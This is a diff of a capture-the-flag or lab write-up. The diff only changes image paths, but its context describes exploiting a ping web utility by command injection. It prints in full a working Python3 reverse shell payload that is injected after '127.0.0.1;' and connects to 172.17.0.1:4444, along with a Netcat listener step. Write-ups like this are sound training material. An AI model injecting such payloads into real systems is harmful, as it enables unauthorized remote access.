@@ -74,13 +74,13 @@ The attack surface is minimal: a single HTTP service to investigate.
 
 Navigating to port 80 in a browser reveals a web page hosting a simple ping utility interface that accepts user input.
 
-![Web interface on port 80](image.png)
+![Web interface on port 80](images/img.png)
 
 **4. Command Injection Discovery**
 
 Testing the input field reveals that it passes the user-supplied value directly to the underlying OS shell without sanitization, resulting in Remote Code Execution (RCE).
 
-![RCE confirmed via command injection](image-1.png)
+![RCE confirmed via command injection](images/img-1.png)
 
 **5. Setting Up the Listener**
 
@@ -99,7 +99,7 @@ The following Python3 reverse shell payload is injected into the ping input fiel
 127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
-![Reverse shell payload injected](image-2.png)
+![Reverse shell payload injected](images/img-2.png)
 
 The connection is received on the Netcat listener. A TTY is then stabilized for a fully interactive shell session:
 
